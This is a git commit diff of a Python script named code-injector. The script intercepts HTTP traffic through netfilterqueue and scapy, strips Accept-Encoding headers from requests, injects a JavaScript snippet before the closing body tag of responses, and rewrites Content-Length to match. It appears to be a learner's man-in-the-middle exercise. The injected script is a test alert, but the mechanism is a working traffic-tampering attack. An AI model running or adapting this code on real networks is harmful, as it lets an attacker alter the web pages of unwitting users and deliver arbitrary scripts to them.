80916a290eb3375d20e6738acc0e0fe2135a0de6
juancv3d <juancvillarios@hotmail.com>
2021-06-14 00:22:51 -0400

    Adding code injection anad checking for web length to then changed with the added code length

--- code-injector/code-injector.py
+++ code-injector/code-injector.py
@@ -8,7 +8,6 @@ import netfilterqueue
 # Regex allow to find patterns in text
 import re
 
-from scapy.error import Scapy_Exception
 
 # Function that change the info of a packet
 def set_load(packet, load):
@@ -25,19 +24,38 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     # Check if the packet has a layer Raw
     if scapy_packet.haslayer(scapy.Raw):
-        # Check if the packet has HTTP request
-        if scapy_packet[scapy.TCP].dport == 80:
-            print('[+] Request')
-            # We search for a pattern that contain the encoding information in the request and replace it with nothing, allowing us to read the HTTP responses
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)  
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(bytes(new_packet))
-        # Check if the TCP layer has 80 in the sport section
-        elif scapy_packet[scapy_packet.TCP].sport == 80:
-            print('[+] Response')
-            print(scapy_packet.show())
-                
-              
+        try:
+            # Check if the packet has HTTP request
+            load = scapy_packet[scapy.Raw].load.decode()
+            if scapy_packet[scapy.TCP].dport == 80:
+                print('[+] Request...')
+                print(scapy_packet.show())
+                # We search for a pattern that contain the encoding information in the request and replace it with nothing, allowing us to read the HTTP responses
+                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load) 
+
+            # Check if the TCP layer has 80 in the sport section
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print('[+] Response...')
+                injection_code = "<script>alert('test');</script>"
+                # Injecting javascript code to the HTML response
+                load = load.replace("</body>", injection_code + "</body>")
+                print("[+] Code Injected...")
+                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+                # Check if there was a conten length
+                if content_length_search and "text/html" in load:
+                    # Change the content length with the extra content length of the script
+                    content_length = content_length_search.group(1)
+                    new_content_length = int(content_length) + len(injection_code)
+                    load = load.replace(content_length, str(new_content_length))
+
+            # Check if the Raw layer was modify
+            if load != scapy_packet[scapy.Raw].load:
+                new_packet = set_load(scapy_packet, load)
+                packet.set_payload(bytes(new_packet))
+                print("[+] Setting payload")
+        except UnicodeDecodeError:
+            pass
+
     packet.accept()
 
 # Create a queue for the network traffic to be replaced
